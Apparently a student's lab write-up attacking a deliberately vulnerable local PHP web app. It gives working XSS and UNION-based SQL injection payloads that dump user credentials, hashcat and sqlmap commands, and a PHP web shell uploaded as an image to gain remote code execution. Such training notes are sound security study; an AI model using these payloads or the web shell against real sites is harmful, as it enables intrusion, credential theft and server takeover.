First of all we can reset all the dbs, if we have problems, using `localhost/capstone/init.php`


# Step 1: enumeration
First of all we need to enumerate all possible directories and files in the web app:
```bash
ffuf -u http://localhost/capstone/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php -recursion
```
- we know that the app is in `php`


At this point we can test if the app allows to register with weak passwords, in the sign up form:
```
hello

hello
hello
```
- ![[Pasted image 20250107163543.png]]
- weak passwords allowed

# XSS
Now we login with our new user and we can see that the login message in the url is reflected in the page:
- ![[Pasted image 20250107163642.png]]


So we try to inject a `<h1>` hrml element:
```url
?message=<h1>test message</h1>
```
- ![[Pasted image 20250107163745.png]]

So we can test for XSS
```html
message=<script>prompt(1)</script>
```
- ![[Pasted image 20250107163826.png]]


<mark style="background: #FF5582A6;">XXS present!</mark>

## Stored xss

We can visit the product and we add a rating:
```html
<script>prompt(1)</script>
```

We send it and we obtain a stored XSS:
- ![[Pasted image 20250107164158.png]]
- ![[Pasted image 20250107164207.png]]


## SQLinjection
We can try to see if there is a SQLi on the `GET` request of a product (when we visit it).

So we put in the url 
```
?coffee=1'or 1=1#
```
- but it doesn't work

So we try with:
```html
?coffee=1' or 1=1--
```
- ![[Pasted image 20250107164543.png]]
- We obtain a result 

<mark style="background: #FF5582A6;">It is vulnerable to SQlinjection</mark>

So we try to dump the db and we start to enumerate the columns and with this payload we get a result:
```html
?coffee=1' UNION select null,null,null,null,null,null,null--
```
- ![[Pasted image 20250107164726.png]]


Trying harder we get that the second and third column are strings:
``` sql
?coffee=1' UNION select null,'a','a',null,null,null,null--
```

So get info from the db:
``` sql
?coffee=1' UNION select null,TABLE_NAME,'a',null,null,null,null from INFORMATION_SCHEMA.TABLES--
```
- ![[Pasted image 20250107165002.png]]


So we extract usernames from users:
```sql
?coffee=1' UNION select null,COLUMN_NAME,'a',null,null,null,null from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'users' --
```
- we get `username` and `password`


Now we extract them:
```sql
?coffee=1' UNION select null,username,password,null,null,null,null from users --
```
- ![[Pasted image 20250107165350.png]]

Let's crack them. We put them into a `.txt` file and run hashcat:
```bash
hashcat HASH_VALUE
```

It gives us info about it, it is bcrypt hash:
```bash
hashcat -m 3200 hashes.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords-top-10000.txt --show
```
- ![[Pasted image 20250107170008.png]]


### SQLMAP
we can also use sqlmap. We put the request in a `.txt` file:
- ![[Pasted image 20250107165826.png]]

Then we run 
```bash
sqlmap -r request.txt -T users --dump 
```
- ![[Pasted image 20250107165934.png]]

A lot of information.


# Admin login (RCE)
We cracked the password so we enter as jeremy.

At this point we visit `localhost/capstone/admin/admin.php`

In this page we can add a new coffee and upload an image.


So we upload an image and in burp we analyze the request.

We try to perform a magic byte injection:
```php
<?php system($_GET['cmd']); ?>
```
- ![[Pasted image 20250107170248.png]]
- we changed also the extension in `.php`
- ![[Pasted image 20250107170332.png]]


So we visit the file:
- ![[Pasted image 20250107170354.png]]
- it is in `assets/11.png`


So we visit 
```html
localhost/capstone/assets/11.php?cmd=whoami
```
- ![[Pasted image 20250107170603.png]]


<mark style="background: #FF5582A6;">We have RCE</mark>

